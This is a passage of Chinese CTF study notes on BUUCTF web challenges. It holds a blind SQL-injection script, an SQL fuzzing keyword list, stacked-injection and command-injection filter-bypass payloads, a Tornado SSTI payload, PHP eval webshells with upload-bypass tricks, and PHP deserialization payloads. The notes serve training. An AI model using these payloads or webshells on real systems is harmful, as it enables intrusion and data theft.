class="string">&quot;id&quot;</span>] = <span class="string">&quot;1^&quot;</span> + <span class="string">&quot;(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)^1&quot;</span> %(i,mid)</span><br><span class="line">        r = requests.post(url,data=temp)</span><br><span class="line">        print(low,high,mid,<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid =(low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> or mid ==<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag +=chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;flag=&quot;</span> ,flag)</span><br></pre></td></tr></table></figure></li>
<li><p>请看这位师傅的<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42967398/article/details/103517730?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161715960816780266221075%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161715960816780266221075&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-3-103517730.pc_search_result_cache&utm_term=BUUCTF++web+HackWorld&spm=1018.2226.3001.4187">题解</a><br>sql字典</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">from</span><br><span class="line">ascii</span><br><span class="line">substr</span><br><span class="line">table</span><br><span class="line">column</span><br><span class="line">by</span><br><span class="line">schema</span><br><span class="line">where</span><br><span class="line">extractvalue</span><br><span class="line">exp</span><br><span class="line"><span class="keyword">if</span></span><br><span class="line">/</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">%</span><br><span class="line">!</span><br><span class="line">@</span><br><span class="line">#</span><br><span class="line">$</span><br><span class="line">^</span><br><span class="line">&amp;</span><br><span class="line">*</span><br><span class="line">-</span><br><span class="line">_</span><br><span class="line">+</span><br><span class="line">=</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">~</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">\</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line"><span class="string">,</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">||</span></span><br><span class="line"><span class="string">&amp;&amp;</span></span><br><span class="line"><span class="string">order</span></span><br><span class="line"><span class="string">updatexml</span></span><br><span class="line"><span class="string">limit</span></span><br><span class="line"><span class="string">And</span></span><br><span class="line"><span class="string">Or</span></span><br><span class="line"><span class="string">%23</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&lt;</span></span><br><span class="line"><span class="string">&gt;</span></span><br><span class="line"><span class="string">regex</span></span><br><span class="line"><span class="string">group_concat</span></span><br><span class="line"><span class="string">table_name</span></span><br><span class="line"><span class="string">table_schema</span></span><br><span class="line"><span class="string">column_name</span></span><br><span class="line"><span class="string">database</span></span><br><span class="line"><span class="string">imformation</span></span><br><span class="line"><span class="string">union select</span></span><br><span class="line"><span class="string">ascii(substr())</span></span><br><span class="line"><span class="string">(select(group_concat(table_name))</span></span><br><span class="line"><span class="string">from(information_schema.tables)where(table_schema=database())</span></span><br><span class="line"><span class="string">(ascii(substr((select(group_concat(flaaag))from(flag)),%s,1))=%s)</span></span><br><span class="line"><span class="string">where(table_schema=database())</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>补充：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hahazaizheli/article/details/96428290?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161717432816780265487351%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161717432816780265487351&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-96428290.pc_search_result_cache&utm_term=%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8CFUZZ%E6%B5%8B%E8%AF%95&spm=1018.2226.3001.4187">使用burp进行Fuzz测试实现SQL注入</a>，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35793285/article/details/111818477?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161717432816780265487351%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161717432816780265487351&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-111818477.pc_search_result_cache&utm_term=%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8CFUZZ%E6%B5%8B%E8%AF%95&spm=1018.2226.3001.4187">burp的Intruder模块</a></p>
</li>
</ul>
<h4 id="GYCTF2020-Blacklist-堆叠注入"><a href="#GYCTF2020-Blacklist-堆叠注入" class="headerlink" title="[GYCTF2020]Blacklist [堆叠注入]"></a>[GYCTF2020]Blacklist [堆叠注入]</h4><p><img src="https://img-blog.csdnimg.cn/20210405191501429.png" alt="在这里插入图片描述"></p>
<ul>
<li>尝试堆叠注入<br><img src="https://img-blog.csdnimg.cn/20210405192726588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>爆列名<br><img src="https://img-blog.csdnimg.cn/20210405192831216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<p>HANDLER方法<br>引自大佬：HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭<br>构造：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/SopRomeo/article/details/105396372?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161762143216780271594201%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161762143216780271594201&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-105396372.pc_search_result_cache&utm_term=%5BGYCTF2020%5DBlacklist&spm=1018.2226.3001.4187">参考文章</a></p>
<h2 id="Ping命令"><a href="#Ping命令" class="headerlink" title="Ping命令"></a>Ping命令</h2><p>常用管道符命令</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&amp; （按位与） 表示任务在后台执行，如要在后台运行redis-server,则有 redis-server &amp;</span><br><span class="line"></span><br><span class="line">&amp;&amp; （逻辑与）表示前一条命令执行成功时，才执行后一条命令 ，如果前面为假，后面的命令也不执行   如 echo <span class="string">&#x27;1‘ &amp;&amp; echo ‘2’</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">| （按位或）表示管道，上一条命令的输出，作为下一条命令参数，直接执行|后面的语句，如 echo ‘yes’ | wc -l</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">|| （逻辑或）表示上一条命令执行失败后，才执行下一条命令，否则只执行前面的语句，如 cat nofile || echo “fail”</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">; 分号表示命令依次执行。</span></span><br></pre></td></tr></table></figure>

<p>1.过滤问题：空格 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125; </span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$<span class="string">&#x27;\x20flag.txt&#x27;</span>&amp;&amp;cat$kg</span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式绕过)</span><br></pre></td></tr></table></figure>
<p>1)变量拼接字符串</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b=ag.php;a=fl;cat$IFS$<span class="number">9</span>$a$b </span><br><span class="line"> </span><br><span class="line"><span class="comment">//为什么要反过来？flag匹配时中间有内容也会被匹配。</span></span><br><span class="line"><span class="comment">//表达式 .* 就是单个字符匹配任意次，即贪婪匹配。以这个表达式为例：a.*b，它将会匹配最长的以a开始，以b结束的字符串。如果用它来搜索aabab的话，它会匹配整个字符串aabab。这被称为贪婪匹配</span></span><br></pre></td></tr></table></figure>
<p>2)base编码绕过<br>base64 编码的方式来绕过 flag 过滤</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">加密命令</span><br><span class="line">echo “cat flag.php” | base64</span><br><span class="line">解密命令并执行</span><br><span class="line">echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh</span><br><span class="line">然后用$IFS$<span class="number">9</span>代替空格。构造payload</span><br><span class="line"></span><br><span class="line">  ?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$<span class="number">9</span>|$IFS$9base64$IFS$<span class="number">9</span>-d$IFS$<span class="number">9</span>|$IFS$9sh  </span><br></pre></td></tr></table></figure>



<p>3)内联执行<br>linux中反引号作为内联使用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat `ls`</span><br></pre></td></tr></table></figure>
<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p> 在linux中nc 后返回网页源码html</p>
<h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/105078717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161477364616780271567725%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161477364616780271567725&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-105078717.pc_search_result_no_baidu_js&utm_term=buuctf+easy_tornado+1">BUUCTF tornado题解</a><br>tornado存在模版<a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/96480967">SSTI</a>注入漏洞，尝试通过此漏洞获取到所需内容<br>1.先访问报错网页</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=Error</span><br></pre></td></tr></table></figure>
<p>2.通过handler.settings对象获取cookie_secret的值，即：<br>handler指向RequestHandler<br>RequestHandler.settings指向self.application.settings<br>所以handler.settings最终指向RequestHandler.application.settings<br>构造如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>3.md5只加密二进制，所以先encode(‘utf-8’)编码为二进制,对于函数<br>hash.digest()<br>返回摘要，作为二进制数据字符串值<br>hash.hexdigest()<br>返回摘要，作为十六进制数据字符串值<br>进而根据题目已知信息编写脚本，获取payload</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h4 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h4><p>(1) 带图片头的php一句话木马</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;eval($_POST[&#x27;v&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>(2) 可解析的php后缀名：<br>php3，php4，php5，pht，phtml,phps<br>注：菜刀连接是要用POST<br>注意MMIE类型为jpeg，因为只允许图片上传<br>Content-Type: image/jpeg<br>绕过过程：<br>1.新建txt文件编写一句话木马，后缀为jpg（还有gif png等格式视情况而定）注意MMIE类型为jpeg，因为只允许图片上传<br>Content-Type: image/jpeg<br>2.Burpsuite抓包改包，修改文件后缀名，直至上传成功，如<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload">BUUCTF upload</a>中只有php后缀名为phtml才可以<br><img src="https://img-blog.csdnimg.cn/20210304204806953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.上传成功后用蚁剑连接<br><img src="https://img-blog.csdnimg.cn/20210304204912254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最终在根目录可找到flag<br><img src="https://img-blog.csdnimg.cn/20210304205040687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="MRCTF-你传你🐎呢"><a href="#MRCTF-你传你🐎呢" class="headerlink" title="[MRCTF]你传你🐎呢"></a>[MRCTF]你传你🐎呢</h3><p>1.htaccess文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.htaccess文件(或者&quot;分布式配置文件&quot;）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</span><br><span class="line"></span><br><span class="line">概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</span><br><span class="line"></span><br><span class="line">启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</span><br><span class="line"></span><br><span class="line">笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</span><br></pre></td></tr></table></figure>
<p>2.上传.htaccess文件，注意文件名必须相同才能够被上传成功</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;webshell.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<p>3.上传一句话木马webshell.jpg</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;v&#x27;</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>4.用蚁剑连接获得flag<br><img src="https://img-blog.csdnimg.cn/20210405185842801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>请求头Referer:<a target="_blank" rel="noopener" href="http://xxxxx/">http://xxxxx</a><br>修改访问浏览器：在User-Agent中修改<br>在本地访问：X-Forwarded-For:127.0.0.1</p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（2021.3.24）最近做到php序列化的题</span><br><span class="line">看了好多师傅们的博客学到了很多</span><br><span class="line">Y4师傅博客：https:&#x2F;&#x2F;blog.csdn.net&#x2F;solitudi&#x2F;article&#x2F;details&#x2F;113588692?spm&#x3D;1001.2014.3001.5502</span><br><span class="line">这里就打算简单总结一下，以备之后复习</span><br></pre></td></tr></table></figure>
<ul>
<li><p>1.protected ,private,public属性<br>var 和 public 声明的字段都是公共字段，因此它们的字段名的序列化格式是相同的。公共字段的字段名按照声明时的字段名进行序列化，但序列化后的字段名中不包括声明时的变量前缀符号 $。</p>
<p>  protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上 \0*\0 的前缀，注意，这里的 \0 表示 ASCII 码为 0 的字符，也就是我们经过 urlencode 后看到的 %00 。</p>
<p>  private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，字段名前面会加上 \0<declared class name>\0 的前缀，这里 <declared class name> 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。在进行长度计算的时候，会把 \0 也计算上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> 再序列化内容中用大写S表示字符串，此时字符串就支持后面的字符串用16进制表示</span><br><span class="line"></span><br><span class="line">- </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### buu NiZhuanSiWei</span><br><span class="line">题目给出源码：</span><br><span class="line">&#96;&#96;&#96;javascript</span><br><span class="line">&lt;?php  </span><br><span class="line">$text &#x3D; $_GET[&quot;text&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$password &#x3D; $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;file_get_contents()函数的功能是读取文件内容到一个字符串</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  &#x2F;&#x2F;useless.php</span><br><span class="line">        $password &#x3D; unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>1.使用data伪协议和文件包含：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data:text/plain,welcome to the zjctf&amp;file=php:<span class="comment">//filter/read=convert.base64-encode/resource=useless.php</span></span><br></pre></td></tr></table></figure>
<p>用php://input伪协议在以POST形式传入“ welcome to the zjctf “ 也可以用data伪协议传参</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/?text=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span></span><br><span class="line"><span class="string">``</span><span class="string">``</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>得到base64编码的页面，解密如下：</span><br><span class="line"><span class="string">``</span><span class="string">`java</span></span><br><span class="line"><span class="string">&lt;?php  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">class Flag&#123;  //flag.php （题目源码注释） </span></span><br><span class="line"><span class="string">    public $file;    </span></span><br><span class="line"><span class="string">    public function __tostring()&#123;  </span></span><br><span class="line"><span class="string">        if(isset($this-&gt;file))&#123;  </span></span><br><span class="line"><span class="string">            echo file_get_contents($this-&gt;file);    //输出文件内容,通过这个函数读取flag</span></span><br><span class="line"><span class="string">            echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span></span><br><span class="line"><span class="string">        &#125;  </span></span><br><span class="line"><span class="string">    &#125;  </span></span><br><span class="line"><span class="string">&#125;  </span></span><br><span class="line"><span class="string">?&gt;  </span></span><br></pre></td></tr></table></figure>
<p>3.反序列化：<br><img src="https://img-blog.csdnimg.cn/20210328105347570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.重新构造payload</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data:text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>5.最后查看源码得到flag</p>
<h3 id="BUUCTF-网鼎杯-2020-青龙组-AreUSerialz"><a href="#BUUCTF-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="BUUCTF [网鼎杯 2020 青龙组]AreUSerialz"></a>BUUCTF [网鼎杯 2020 青龙组]AreUSerialz</h3><ul>
<li>知识点：php反序列化漏洞，弱类型比较</li>
<li>打开地址看到<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($this-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>($this-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $this-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            